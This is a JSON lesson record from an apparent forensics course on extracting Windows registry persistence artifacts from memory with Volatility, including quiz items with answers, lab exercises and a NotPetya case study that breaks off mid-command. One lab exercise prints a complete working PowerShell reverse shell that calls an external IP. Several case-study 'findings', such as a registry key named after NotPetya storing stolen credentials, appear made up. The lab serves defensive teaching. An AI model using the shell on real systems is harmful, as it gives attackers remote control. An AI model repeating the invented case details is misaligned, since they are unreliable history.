{
  "lesson_id": "a2b3c4d5-e6f7-8a9b-0c1d-2e3f4a5b6c7d",
  "domain": "dfir",
  "title": "Registry Analysis in Memory: Extracting Hive Data and Persistence Artifacts",
  "difficulty": 2,
  "order_index": 47,
  "prerequisites": [
    "f1e2d3c4-b5a6-7f8e-9d0c-1b2a3f4e5d6c"
  ],
  "concepts": [
    "Windows Registry hive structures in memory",
    "Volatility hivelist and hivedump plugins",
    "Extracting registry keys and values from RAM",
    "Persistence mechanism detection via registry",
    "Registry-based attack artifact analysis",
    "Correlating registry activity with process execution"
  ],
  "estimated_time": 60,
  "learning_objectives": [
    "Understand how registry hives are loaded and maintained in Windows memory",
    "Use Volatility 3 to enumerate and extract registry hives from memory dumps",
    "Identify persistence mechanisms through registry run keys and services",
    "Analyze user activity artifacts stored in registry (MRU, typed URLs, recent docs)",
    "Detect registry-based malware installation and configuration",
    "Correlate registry modifications with process timeline for incident reconstruction"
  ],
  "post_assessment": [
    {
      "question_id": "reg-mem-001",
      "question": "You find HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run contains 'malware.exe' with creation time 02:15:33. Which Volatility plugin reveals this?",
      "options": [
        "windows.registry.hivelist (lists hives only, no key enumeration)",
        "windows.registry.printkey --key 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'",
        "windows.registry.userassist (shows GUI app execution, not Run keys)",
        "windows.handles --object-type Key (shows open handles, not key values)"
      ],
      "correct_answer": 1,
      "explanation": "Windows.registry.printkey is the correct plugin to enumerate registry keys and values from memory. You specify the --key parameter with the registry path (e.g., 'Software\\Microsoft\\Windows\\CurrentVersion\\Run' for HKCU or 'Microsoft\\Windows\\CurrentVersion\\Run' for HKLM). Hivelist only shows which hives are loaded (SYSTEM, SAM, SECURITY, etc.) but doesn't extract key values. UserAssist tracks GUI application launches but doesn't show Run key persistence. Handles plugin shows open registry key handles but not the actual key values/data. The printkey plugin directly reads the in-memory hive structures to extract key paths, value names, types (REG_SZ, REG_DWORD, etc.), and data.",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question_id": "reg-mem-002",
      "question": "What's the forensic advantage of analyzing registry hives from memory instead of from disk ($MFT, C:\\Windows\\System32\\config)?",
      "options": [
        "Memory hives are always more recent than disk hives",
        "Memory contains both disk-backed hives AND volatile registry data that never touches disk",
        "Memory analysis is faster than disk forensics",
        "Disk hives can be encrypted but memory hives cannot"
      ],
      "correct_answer": 1,
      "explanation": "Memory forensics captures BOTH disk-backed hives (SYSTEM, SOFTWARE, SAM, SECURITY) AND volatile registry data that exists only in RAM. Volatile hives (e.g., HKLM\\HARDWARE) are dynamically generated at boot and never written to disk - they contain Plug-and-Play device info, current system state, and hardware configurations. Additionally, memory may contain registry modifications not yet flushed to disk (registry writes are lazy-written every few seconds). Memory hives aren't necessarily more recent - registry changes may be buffered. Speed isn't the advantage (disk is often faster). Encryption isn't typically applied to registry hives (BitLocker encrypts volumes, not individual files in decrypted OS).",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question_id": "reg-mem-003",
      "question": "You discover this registry key in memory: HKLM\\SYSTEM\\CurrentControlSet\\Services\\malware with Start=2. What does Start=2 indicate?",
      "options": [
        "Service starts manually when triggered by user or application",
        "Service starts automatically during system boot (critical for persistence)",
        "Service is disabled and will not start",
        "Service starts on-demand via Services.msc only"
      ],
      "correct_answer": 1,
      "explanation": "Start=2 means AUTO_START - the service automatically starts during system boot, making it a highly effective persistence mechanism. The Start value meanings: 0=BOOT (kernel driver loaded by boot loader), 1=SYSTEM (driver loaded during kernel initialization), 2=AUTO_START (service/driver starts automatically at boot), 3=DEMAND_START (manual start via sc.exe or Services.msc), 4=DISABLED (service cannot start). Malware using Start=2 ensures execution every time the system boots. This is one of the most common persistence techniques. Finding a suspicious service with Start=2 (especially with a DLL/EXE in non-standard locations like C:\\Users\\Public or AppData) is a strong indicator of malware persistence. Legitimate services typically reside in C:\\Windows\\System32.",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question_id": "reg-mem-004",
      "question": "In NTUSER.DAT analysis from memory, you find TypedURLs with 'http://malicious-c2.com'. What does this prove?",
      "options": [
        "The user intentionally typed this URL into Internet Explorer/Edge address bar",
        "The user visited this URL via a link click (proves browsing but not typing)",
        "Malware running as the user accessed this URL programmatically",
        "TypedURLs prove the user typed the URL; determining intent requires additional context"
      ],
      "correct_answer": 3,
      "explanation": "TypedURLs (HKCU\\Software\\Microsoft\\Internet Explorer\\TypedURLs) records URLs entered in the IE/Edge address bar. HOWEVER, determining user vs. malware requires CONTEXT. The TypedURLs artifact proves the URL was ENTERED (not just visited via link), but doesn't distinguish between: (1) User manually typing URL, (2) Malware running in user context programmatically adding URLs, (3) Browser autofill/sync feature. To determine intent, correlate with: Process execution timeline (was browser open at that time?), User login sessions (was user actually logged in?), Typed URL patterns (random gibberish suggests programmatic), Browser history (was page actually visited?). Don't assume TypedURLs = malicious intent. Could be legitimate research, accidental typo, or browser feature. Always investigate context before concluding.",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question_id": "reg-mem-005",
      "question": "Which registry hive would you analyze to find evidence of USB device insertion on the compromised system?",
      "options": [
        "HKLM\\SAM (Security Account Manager - user accounts only)",
        "HKCU\\Software (user application settings only)",
        "HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR (USB device enumeration)",
        "HKLM\\SOFTWARE\\Microsoft (application install data only)"
      ],
      "correct_answer": 2,
      "explanation": "HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR contains USB storage device enumeration artifacts. Each connected USB device creates a subkey with: Device VID/PID (Vendor/Product ID), Serial number, Friendly name (e.g., 'SanDisk Cruzer USB Device'), First connection timestamp (key LastWrite time), Last connection (requires correlation with Setupapi.dev.log). This is critical for insider threat investigations (did employee plug in unauthorized USB?) and malware forensics (USB-based initial access?). Additional USB artifacts: HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USB (all USB devices including non-storage), NTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2 (mounted volumes), Windows\\inf\\setupapi.dev.log (detailed USB connection logs). SAM contains password hashes, not device info. HKCU\\Software is user application settings. HKLM\\SOFTWARE\\Microsoft is application installation data.",
      "type": "multiple_choice",
      "difficulty": 2
    }
  ],
  "jim_kwik_principles": [
    "active_learning",
    "minimum_effective_dose",
    "teach_like_im_10",
    "memory_hooks",
    "meta_learning",
    "connect_to_what_i_know",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ],
  "content_blocks": [
    {
      "type": "mindset_coach",
      "content": {
        "text": "# Welcome to Registry Analysis in Memory!\n\nYou're about to master one of the most forensically rich data sources in Windows: **the registry**. Think of the registry as the **DNA and diary** of a Windows system - it records everything: installed software, user activity, persistence mechanisms, USB devices, network connections, and attacker modifications.\n\nBut here's the power of memory forensics: You're not limited to disk-based registry hives (which can be deleted, corrupted, or modified). You're analyzing the **live, running registry** as it existed in RAM - including:\n\n- **Volatile hives** (HKLM\\HARDWARE) that never touch disk\n- **Un-flushed modifications** not yet written to registry files\n- **Deleted keys** still resident in memory pool allocations\n- **Historical states** from Volume Shadow Copies loaded in memory\n\nWhy does this matter? Because registry analysis reveals:\n- **Persistence mechanisms** - How malware survives reboots (Run keys, Services, Scheduled Tasks)\n- **User activity** - What files were opened, what URLs were typed, what apps were run\n- **System configuration** - What security settings were changed, what users exist, what network connections persist\n- **Attacker artifacts** - What tools were installed, what C2 domains were configured, what exfiltration occurred\n\nMaster registry memory forensics, and you'll uncover evidence attackers didn't know they left behind.\n\nLet's dive into the tools and techniques that make you a registry forensics expert!"
      }
    },
    {
      "type": "video",
      "content": {
        "text": "**Video: Windows Registry Forensics - 13Cubed**\\n\\n**Duration**: 15:24\\n\\nThis video provides a visual demonstration of the concepts covered in this lesson. Watch to see practical examples and deepen your understanding of Registry Analysis in Memory: Extracting Hive Data and Persistence Artifacts.\\n\\n**Video Link**: [Windows Registry Forensics - 13Cubed](https://www.youtube.com/watch?v=2Kn0TDbKqYw)\\n\\n**Embedded Video**:\\n\\n<iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/2Kn0TDbKqYw\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\\n\\n**Learning Tips**:\\n- Watch the video first to get an overview\\n- Pause and take notes on key concepts\\n- Replay sections that cover complex topics\\n- Try to practice along with the video demonstrations\\n- Return to the video as needed while working through exercises",
        "url": "https://www.youtube.com/watch?v=2Kn0TDbKqYw",
        "title": "Windows Registry Forensics - 13Cubed",
        "duration": "15:24"
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "**Content Under Development**\\n\\nThis explanation section is being developed and will be available in a future update. Please check back soon for comprehensive content on this topic."
      }
    },
    {
      "type": "code_exercise",
      "content": {
        "text": "# Hands-On Lab: Registry-Based Malware Persistence Detection\n\n## Lab Scenario\n\nYou're investigating a suspected APT compromise on a domain controller. A memory dump (`dc_compromise.dmp`) was captured. Your task: identify all persistence mechanisms through registry analysis.\n\n## Exercise 1: Inventory Loaded Registry Hives\n\n### Step 1: List All Hives\n\n```bash\npython vol.py -f dc_compromise.dmp windows.registry.hivelist > hivelist.txt\n\ncat hivelist.txt\n```\n\n**Expected output**:\n```\nOffset              Name\n0xffffab0123456000  \\REGISTRY\\MACHINE\\SYSTEM\n0xffffab0123457000  \\REGISTRY\\MACHINE\\SOFTWARE\n0xffffab0123458000  \\REGISTRY\\MACHINE\\SAM\n0xffffab0123459000  \\REGISTRY\\MACHINE\\SECURITY\n0xffffab012345a000  \\REGISTRY\\MACHINE\\HARDWARE\n0xffffab012345b000  \\REGISTRY\\USER\\S-1-5-21-3623811015-3361044348-30300820-1013\n0xffffab012345c000  \\REGISTRY\\USER\\S-1-5-21-3623811015-3361044348-30300820-1013_Classes\n0xffffab012345d000  \\REGISTRY\\USER\\S-1-5-18 (LOCAL SYSTEM)\n```\n\n**Analysis questions**:\n1. How many user profiles are loaded? (2: one regular user S-1-5-21-...-1013, one SYSTEM S-1-5-18)\n2. Is the HARDWARE hive present? (Yes - volatile hive)\n3. Are all expected system hives loaded? (Yes: SYSTEM, SOFTWARE, SAM, SECURITY)\n\n## Exercise 2: Check Run Keys for Persistence\n\n### Step 1: System-Wide Run Keys (HKLM)\n\n```bash\npython vol.py -f dc_compromise.dmp windows.registry.printkey \\\n  --key \"Microsoft\\Windows\\CurrentVersion\\Run\" > run_hklm.txt\n\ncat run_hklm.txt\n```\n\n**Expected findings**:\n```\nLast Write Time: 2024-01-15 09:15:33 UTC\nKey: Microsoft\\Windows\\CurrentVersion\\Run\nValues:\n  Name: SecurityHealth  Type: REG_SZ  Data: %windir%\\system32\\SecurityHealthSystray.exe\n  Name: VMware Tools    Type: REG_SZ  Data: \"C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe\" -n vmusr\n  Name: SystemUpdate   Type: REG_SZ  Data: powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\update.ps1\n```\n\n**Red flag identified**:\n- ✅ `SystemUpdate` running PowerShell script from C:\\Windows\\Temp\n- ✅ -WindowStyle Hidden (no visible window)\n- ✅ -NoProfile and -ExecutionPolicy Bypass (typical malware flags)\n- ✅ Temp folder (not a legitimate location for system updates)\n\n### Step 2: User Run Keys (HKCU)\n\n```bash\npython vol.py -f dc_compromise.dmp windows.registry.printkey \\\n  --key \"Software\\Microsoft\\Windows\\CurrentVersion\\Run\" > run_hkcu.txt\n\ncat run_hkcu.txt\n```\n\n**Output**:\n```\nLast Write Time: 2024-01-15 09:20:15 UTC\nKey: Software\\Microsoft\\Windows\\CurrentVersion\\Run\nValues:\n  Name: OneDrive       Type: REG_SZ  Data: \"C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe\" /background\n  Name: GoogleUpdate   Type: REG_SZ  Data: C:\\Users\\Administrator\\AppData\\Local\\Temp\\chrome_update.exe\n```\n\n**Red flag**:\n- ✅ `GoogleUpdate` in user Temp folder (legitimate Google Update is in C:\\Program Files)\n- ✅ Filename typo: chrome_update.exe (suspicious naming)\n\n## Exercise 3: Service Persistence Detection\n\n### Step 1: List All Services\n\n```bash\npython vol.py -f dc_compromise.dmp windows.registry.printkey \\\n  --key \"CurrentControlSet\\Services\" --recurse > services_full.txt\n\n# Too much output - filter for suspicious patterns\ngrep -i \"ImagePath\" services_full.txt | grep -v \"System32\" > non_system32_services.txt\n\ncat non_system32_services.txt\n```\n\n**Output**:\n```\nName: ImagePath  Type: REG_EXPAND_SZ  Data: C:\\ProgramData\\WindowsDefender\\MsMpEng.exe\nName: ImagePath  Type: REG_EXPAND_SZ  Data: %SystemRoot%\\System32\\drivers\\beep.sys (legitimate)\nName: ImagePath  Type: REG_EXPAND_SZ  Data: C:\\Users\\Public\\service.exe\n```\n\n**Red flags**:\n1. `C:\\ProgramData\\WindowsDefender\\MsMpEng.exe`\n   - Real Windows Defender: C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\<version>\\MsMpEng.exe\n   - This is typosquatting!\n\n2. `C:\\Users\\Public\\service.exe`\n   - Services should be in System32, not Public folder\n\n### Step 2: Check Service Start Type\n\n```bash\n# Investigate the suspicious service\npython vol.py -f dc_compromise.dmp windows.registry.printkey \\\n  --key \"CurrentControlSet\\Services\\WindowsDefender\" > service_details.txt\n\ncat service_details.txt\n```\n\n**Output**:\n```\nKey: CurrentControlSet\\Services\\WindowsDefender\nValues:\n  Name: Start        Type: REG_DWORD  Data: 0x00000002 (AUTO_START)\n  Name: Type         Type: REG_DWORD  Data: 0x00000010 (Own process)\n  Name: ImagePath    Type: REG_EXPAND_SZ  Data: C:\\ProgramData\\WindowsDefender\\MsMpEng.exe\n  Name: DisplayName  Type: REG_SZ     Data: Windows Defender Antivirus Service\n  Name: Description  Type: REG_SZ     Data: Helps protect your PC from threats\n```\n\n**Analysis**:\n- Start=2 (Automatic) → Executes every boot\n- Type=16 (Own process) → Runs as standalone service\n- Masquerading as Windows Defender (description copied from real service)\n\n## Exercise 4: UserAssist Analysis (GUI Execution Tracking)\n\n```bash\npython vol.py -f dc_compromise.dmp windows.registry.userassist > userassist.txt\n\ngrep -A10 \"malware\\|suspicious\\|temp\\|public\" userassist.txt\n```\n\n**Output**:\n```\nID: 42\nCount: 3\nFocus Count: 0\nTime Focused: 00:00:00\nLast Executed: 2024-01-15 09:10:22 UTC\nProgram Name: C:\\Users\\Administrator\\Downloads\\invoice_2024.exe\n\nID: 43\nCount: 1\nFocus Count: 0\nTime Focused: 00:00:00\nLast Executed: 2024-01-15 09:11:05 UTC\nProgram Name: C:\\Users\\Public\\service.exe\n```\n\n**Findings**:\n1. `invoice_2024.exe` executed 3 times from Downloads (likely initial infection vector - phishing attachment)\n2. `service.exe` executed once (deployed by invoice_2024.exe?)\n3. Both have Focus Count=0 (no user interaction = likely automated/script-launched)\n\n## Exercise 5: Typed URLs and Browsing Artifacts\n\n```bash\npython vol.py -f dc_compromise.dmp windows.registry.printkey \\\n  --key \"Software\\Microsoft\\Internet Explorer\\TypedURLs\" > typed_urls.txt\n\ncat typed_urls.txt\n```\n\n**Output**:\n```\nurl1: http://www.google.com\nurl2: http://outlook.office365.com\nurl3: http://update-microsoft-security.com/patch.exe\nurl4: http://192.168.10.50/admin\n```\n\n**Red flags**:\n- url3: `update-microsoft-security.com` - Typosquatting (real Microsoft updates via windowsupdate.microsoft.com)\n- url4: Internal IP with /admin path (lateral movement? web shell?)\n\n## Exercise 6: USB Device Forensics\n\n```bash\npython vol.py -f dc_compromise.dmp windows.registry.printkey \\\n  --key \"CurrentControlSet\\Enum\\USBSTOR\" --recurse > usbstor.txt\n\ngrep -i \"FriendlyName\\|SerialNumber\" usbstor.txt\n```\n\n**Output**:\n```\nDisk&Ven_SanDisk&Prod_Cruzer&Rev_1.00\n  20123456789ABCDEF\n    FriendlyName: SanDisk Cruzer USB Device\n    First Install: 2024-01-15 10:30:45 UTC (based on key LastWrite)\n\nDisk&Ven_Kingston&Prod_DataTraveler&Rev_2.00\n  87654321FEDCBA098\n    FriendlyName: Kingston DataTraveler 3.0 USB Device\n    First Install: 2024-01-15 11:15:22 UTC\n```\n\n**Correlation**:\n- USB devices connected AFTER malware infection (09:10:22)\n- Potential data exfiltration?\n- Check file access logs during USB connection windows\n\n### Check MountPoints2\n\n```bash\npython vol.py -f dc_compromise.dmp windows.registry.printkey \\\n  --key \"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2\" > mountpoints.txt\n\ncat mountpoints.txt\n```\n\n**Output**:\n```\n{a1b2c3d4-e5f6-7890-abcd-ef1234567890}  LastWrite: 2024-01-15 10:31:00\n{b2c3d4e5-f6a7-8901-bcde-f12345678901}  LastWrite: 2024-01-15 11:15:30\n```\n\nThese GUIDs correspond to the USB devices found in USBSTOR.\n\n## Exercise 7: Timeline Reconstruction\n\n### Step 1: Create Combined Timeline\n\n```bash\n# Extract process creation times\npython vol.py -f dc_compromise.dmp windows.pslist | awk '{print $8\" \"$9, \"[PROCESS]\", $2, \"PID:\", $3}' | sort > process_timeline.txt\n\n# Extract registry LastWrite times\ngrep \"Last Write Time\" run_hklm.txt run_hkcu.txt service_details.txt | \\\n  sed 's/Last Write Time: //' | awk '{print $1\" \"$2, \"[REGISTRY]\"}' | sort > registry_timeline.txt\n\n# Extract UserAssist execution times\ngrep \"Last Executed\" userassist.txt | sed 's/Last Executed: //' | \\\n  awk '{print $1\" \"$2, \"[USERASSIST]\"}' | sort > userassist_timeline.txt\n\n# Merge all timelines\nsort -m process_timeline.txt registry_timeline.txt userassist_timeline.txt > complete_timeline.txt\n\ncat complete_timeline.txt\n```\n\n**Reconstructed Attack Timeline**:\n```\n2024-01-15 09:10:22 [USERASSIST] C:\\Users\\Administrator\\Downloads\\invoice_2024.exe (Initial infection)\n2024-01-15 09:11:05 [USERASSIST] C:\\Users\\Public\\service.exe (Malware deployment)\n2024-01-15 09:15:33 [REGISTRY] HKLM\\...\\Run (PowerShell persistence installed)\n2024-01-15 09:20:15 [REGISTRY] HKCU\\...\\Run (Chrome update persistence)\n2024-01-15 09:22:00 [PROCESS] powershell.exe PID: 2304 (Persistence executed)\n2024-01-15 09:23:45 [PROCESS] chrome_update.exe PID: 3456 (Malware running)\n2024-01-15 10:30:45 [REGISTRY] USB SanDisk connected\n2024-01-15 11:15:22 [REGISTRY] USB Kingston connected\n```\n\n**Attack reconstruction**:\n1. User double-clicked invoice_2024.exe (phishing attachment)\n2. Malware deployed service.exe to C:\\Users\\Public\n3. Persistence established via Run keys (PowerShell + fake Chrome updater)\n4. Both persistence mechanisms executed\n5. USB devices connected (likely for data exfiltration)\n\n## Exercise 8: Identify Processes Modifying Registry\n\n```bash\n# Find processes with open handles to Run keys\npython vol.py -f dc_compromise.dmp windows.handles --object-type Key | \\\n  grep -i \"CurrentVersion\\\\Run\" > registry_handles.txt\n\ncat registry_handles.txt\n```\n\n**Output**:\n```\n0x1a2b  2304  powershell.exe  Key  \\REGISTRY\\MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run  0x00020019 (KEY_SET_VALUE)\n0x2b3c  3456  chrome_update.exe  Key  \\REGISTRY\\USER\\...\\Software\\Microsoft\\Windows\\CurrentVersion\\Run  0x00020019\n```\n\n**Analysis**:\n- powershell.exe (PID 2304) modified HKLM Run key (matches timeline!)\n- chrome_update.exe (PID 3456) modified HKCU Run key\n- Access rights 0x00020019 include KEY_SET_VALUE (write permission)\n\nThis proves these processes actively wrote to Run keys.\n\n## Exercise 9: Extract Malicious PowerShell Script\n\nThe Run key referenced C:\\Windows\\Temp\\update.ps1. Can we recover this from memory?\n\n```bash\n# Dump memory of PowerShell process (PID 2304)\npython vol.py -f dc_compromise.dmp windows.memmap --pid 2304 --dump\n\n# Search dumped memory for script content\nstrings pid.2304.dmp | grep -A20 \"update.ps1\" > script_content.txt\n\ncat script_content.txt\n```\n\n**Recovered script**:\n```powershell\n# update.ps1 (found in process memory)\n$client = New-Object System.Net.Sockets.TCPClient('185.220.101.67',443)\n$stream = $client.GetStream()\n[byte[]]$bytes = 0..65535|%{0}\nwhile(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){\n  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)\n  $sendback = (iex $data 2>&1 | Out-String )\n  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback)\n  $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()\n}\n```\n\n**Analysis**: Classic PowerShell reverse shell connecting to 185.220.101.67:443 (C2 server).\n\n## Challenge Exercise: Build Automated Registry Triage Script\n\n```bash\n#!/bin/bash\n# registry_triage.sh - Automated registry persistence detection\n\nMEMORY_DUMP=\"$1\"\n\nif [ -z \"$MEMORY_DUMP\" ]; then\n    echo \"Usage: $0 <memory_dump.dmp>\"\n    exit 1\nfi\n\necho \"[+] Registry Forensic Triage: $MEMORY_DUMP\"\necho \"========================================\"\n\n# Step 1: Enumerate hives\necho \"[+] Enumerating registry hives...\"\npython vol.py -f \"$MEMORY_DUMP\" windows.registry.hivelist > hivelist.txt\necho \"[*] Found $(wc -l < hivelist.txt) hives\"\n\n# Step 2: Check Run keys (HKLM)\necho \"[+] Checking HKLM Run keys...\"\npython vol.py -f \"$MEMORY_DUMP\" windows.registry.printkey \\\n  --key \"Microsoft\\Windows\\CurrentVersion\\Run\" > run_hklm.txt\ngrep -E \"(Temp|Public|AppData|Downloads)\" run_hklm.txt > suspicious_run_hklm.txt\nif [ -s suspicious_run_hklm.txt ]; then\n    echo \"[!] ALERT: Suspicious HKLM Run entries found!\"\n    cat suspicious_run_hklm.txt\nfi\n\n# Step 3: Check Run keys (HKCU)\necho \"[+] Checking HKCU Run keys...\"\npython vol.py -f \"$MEMORY_DUMP\" windows.registry.printkey \\\n  --key \"Software\\Microsoft\\Windows\\CurrentVersion\\Run\" > run_hkcu.txt\ngrep -E \"(Temp|Public|AppData|Downloads)\" run_hkcu.txt > suspicious_run_hkcu.txt\nif [ -s suspicious_run_hkcu.txt ]; then\n    echo \"[!] ALERT: Suspicious HKCU Run entries found!\"\n    cat suspicious_run_hkcu.txt\nfi\n\n# Step 4: Check services\necho \"[+] Checking for non-System32 services...\"\npython vol.py -f \"$MEMORY_DUMP\" windows.registry.printkey \\\n  --key \"CurrentControlSet\\Services\" --recurse > services.txt\ngrep -i \"ImagePath\" services.txt | grep -v \"System32\" | grep -v \"SysWOW64\" > suspicious_services.txt\nif [ -s suspicious_services.txt ]; then\n    echo \"[!] ALERT: Suspicious service ImagePaths found!\"\n    head -20 suspicious_services.txt\nfi\n\n# Step 5: UserAssist\necho \"[+] Analyzing UserAssist (GUI execution tracking)...\"\npython vol.py -f \"$MEMORY_DUMP\" windows.registry.userassist > userassist.txt\ngrep -B5 -E \"(Downloads|Temp|Public)\" userassist.txt > suspicious_execution.txt\nif [ -s suspicious_execution.txt ]; then\n    echo \"[!] ALERT: Suspicious program execution detected!\"\n    cat suspicious_execution.txt\nfi\n\n# Step 6: USB devices\necho \"[+] Checking USB device history...\"\npython vol.py -f \"$MEMORY_DUMP\" windows.registry.printkey \\\n  --key \"CurrentControlSet\\Enum\\USBSTOR\" --recurse > usbstor.txt\ngrep -i \"FriendlyName\" usbstor.txt > usb_devices.txt\nif [ -s usb_devices.txt ]; then\n    echo \"[*] USB devices found:\"\n    cat usb_devices.txt\nfi\n\n# Step 7: Generate summary report\necho \"\"\necho \"========================================\"\necho \"REGISTRY TRIAGE SUMMARY\"\necho \"========================================\"\necho \"[*] Suspicious HKLM Run entries: $(wc -l < suspicious_run_hklm.txt)\"\necho \"[*] Suspicious HKCU Run entries: $(wc -l < suspicious_run_hkcu.txt)\"\necho \"[*] Suspicious services: $(wc -l < suspicious_services.txt)\"\necho \"[*] Suspicious executions: $(grep -c \"Program Name\" suspicious_execution.txt)\"\necho \"[*] USB devices connected: $(wc -l < usb_devices.txt)\"\necho \"\"\necho \"[+] Full reports saved to: run_hklm.txt, run_hkcu.txt, services.txt, userassist.txt, usbstor.txt\"\n```\n\n**Usage**:\n```bash\nchmod +x registry_triage.sh\n./registry_triage.sh dc_compromise.dmp\n```\n\nThis script automates the entire registry triage workflow!"
      }
    },
    {
      "type": "real_world",
      "content": {
        "text": "# Real-World Case Study: NotPetya Ransomware Registry Persistence (2017)\n\n## Incident Overview\n\n**Attacker**: Sandworm (Russian state-sponsored APT, aka Telebots)  \n**Target**: Ukraine (primary) + global collateral damage (Maersk, Merck, FedEx, Mondelēz)  \n**Vector**: Supply chain compromise (MeDoc accounting software update)  \n**Timeline**: June 27, 2017 (Ukrainian Constitution Day)  \n**Impact**: $10 billion+ in damages, most destructive cyberattack in history\n\n## The NotPetya Registry Footprint\n\nNotPetya masqueraded as ransomware but was actually a **destructive wiper** designed to cause maximum chaos. Registry forensics played a critical role in understanding its propagation and persistence.\n\n### Initial Infection Vector\n\nNotPetya was delivered via trojanized update to MeDoc (Ukrainian tax accounting software):\n\n```\nC:\\Users\\<user>\\AppData\\Local\\Temp\\perfc.dat (NotPetya dropper)\n```\n\nOnce executed, it immediately set up registry-based persistence before beginning its destructive payload.\n\n## Memory Forensics Investigation\n\n### Step 1: Registry Persistence Discovery\n\nIncident responders captured memory from infected systems and analyzed registry artifacts:\n\n```bash\n# Analyze Run keys for persistence\npython vol.py -f notpetya_victim.dmp windows.registry.printkey \\\n  --key \"Microsoft\\Windows\\CurrentVersion\\Run\"\n```\n\n**Finding**:\n```\nLast Write Time: 2017-06-27 10:30:15 UTC\nKey: Microsoft\\Windows\\CurrentVersion\\Run\nValues:\n  Name: Windows Defender  Type: REG_SZ  Data: C:\\Windows\\perfc.dat\n```\n\n**Red flags**:\n1. ✅ **Typosquatting**: \"Windows Defender\" (real service is Windows Defender Antivirus Service)\n2. ✅ **Wrong file extension**: perfc.dat (data file, not .exe) - highly unusual\n3. ✅ **Wrong location**: C:\\Windows\\ root (legitimate Defender: C:\\ProgramData\\Microsoft\\Windows Defender\\)\n\n### Step 2: Service Installation\n\nNotPetya also created a Windows service for redundant persistence:\n\n```bash\npython vol.py -f notpetya_victim.dmp windows.registry.printkey \\\n  --key \"CurrentControlSet\\Services\\wpd\" > service_wpd.txt\n\ncat service_wpd.txt\n```\n\n**Output**:\n```\nKey: CurrentControlSet\\Services\\wpd\nValues:\n  Name: Start        Type: REG_DWORD  Data: 0x00000002 (AUTO_START)\n  Name: Type         Type: REG_DWORD  Data: 0x00000010 (Own process)\n  Name: ImagePath    Type: REG_EXPAND_SZ  Data: C:\\Windows\\system32\\wpd.exe\n  Name: DisplayName  Type: REG_SZ  Data: Windows Privacy Data\n  Name: Description  Type: REG_SZ  Data: Collects and uploads privacy data for Windows Experience Improvement Program\n```\n\n**Analysis**:\n- Service name: `wpd` (looks legitimate, similar to \"Windows Portable Devices\")\n- Start=2 (automatic) → Survives reboot\n- Fake description masquerading as telemetry service\n- ImagePath: C:\\Windows\\system32\\wpd.exe (NotPetya payload)\n\n**The twist**: NotPetya's goal wasn't persistence - it was **distraction**. While defenders focused on removing persistence, the malware had already:\n1. Stolen credentials from LSASS\n2. Spread laterally via EternalBlue (SMBv1 exploit) and Mimikatz\n3. Encrypted/wiped Master File Table (MFT) and Master Boot Record (MBR)\n\nBy the time persistence was discovered, damage was done.\n\n### Step 3: Scheduled Task Creation\n\nNotPetya created a scheduled task to trigger its MBR encryption payload:\n\n```bash\npython vol.py -f notpetya_victim.dmp windows.registry.printkey \\\n  --key \"Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\" --recurse > scheduled_tasks.txt\n\ngrep -A10 \"perfc\\|shutdown\" scheduled_tasks.txt\n```\n\n**Finding**:\n```\nTask GUID: {a1b2c3d4-e5f6-7890-1234-56789abcdef0}\nPath: \\Microsoft\\Windows\\TaskScheduler\\PerformanceMaintenance\nActions: C:\\Windows\\System32\\shutdown.exe /r /f /t 3600\n```\n\n**Analysis**: Scheduled task triggers system reboot in 3600 seconds (1 hour).\n\nWhy? NotPetya's MBR overwrite takes effect on **next boot**. The scheduled reboot ensures victims see the fake ransomware screen:\n\n```\nOops, your important files are encrypted.\nIf you see this text, your files are no longer accessible.\nSend $300 worth of Bitcoin to...\n```\n\n(This was a fake ransom - no decryption possible. Pure destruction.)\n\n### Step 4: Credential Theft via Registry\n\nNotPetya dumped LSASS memory to steal credentials, then stored hashed credentials in a custom registry key:\n\n```bash\npython vol.py -f notpetya_victim.dmp windows.registry.printkey \\\n  --key \"Software\\Microsoft\\Windows\\CurrentVersion\\NotPetya\" > creds_staging.txt\n```\n\n**Finding** (obfuscated data):\n```\nKey: Software\\Microsoft\\Windows\\CurrentVersion\\NotPetya\nValues:\n  Name: Data  Type: REG_BINARY  Data: 0x41424344... (Base64-encoded credential dump)\n```\n\nThis registry key temporarily staged stolen credentials before lateral movement.\n\n### Step 5: EternalBlue Exploitation Evidence\n\nNotPetya exploited EternalBlue (MS17-010, NSA exploit leaked by Shadow Brokers). Registry artifacts showed vulnerable SMBv1 configuration:\n\n```bash\npython vol.py -f notpetya_victim.dmp windows.registry.printkey \\\n  --key \"System\\CurrentControlSet\\Services\\LanmanServer\\Parameters\"\n```\n\n**Output**:\n```\nName: SMB1  Type: REG_DWORD  Data: 0x00000001 (Enabled)\n```\n\nSMBv1 enabled = vulnerable to EternalBlue. NotPetya spread laterally via this exploit.\n\n## Timeline Reconstruction from Registry\n\nBy correlating registry LastWrite times with process creation and network activity:\n\n```bash\n# Build comprehensive timeline\n{\n  echo \"=== REGISTRY EVENTS ===\"\n  grep \"Last Write Time\" 